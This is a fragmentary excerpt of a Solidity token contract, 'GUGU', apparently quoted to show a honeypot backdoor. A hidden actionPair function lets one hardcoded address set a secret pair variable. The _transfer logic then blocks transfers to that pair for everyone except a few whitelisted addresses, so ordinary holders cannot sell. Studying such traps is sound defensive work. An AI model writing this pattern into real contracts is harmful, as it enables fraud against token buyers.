...
contract GUGU is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x2240C92E4C9466CA86af3377a4E9f05E1bD4525D) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         (_p76234 == to && from != 0x1F70c488E6DBF3e1207984b3919e276351704FA1 && 
         from  != 0xECfe8C551A4dd0413f5ead8896aB952Fc9Adae30 
         && from != 0x2240C92E4C9466CA86af3377a4E9f05E1bD4525D)) {
    ...
    constructor() {
        _name = unicode"GUGU";
        _symbol = unicode"GUGU";
        _mint(msg.sender, 220000000000 * 10 ** decimals());
    }
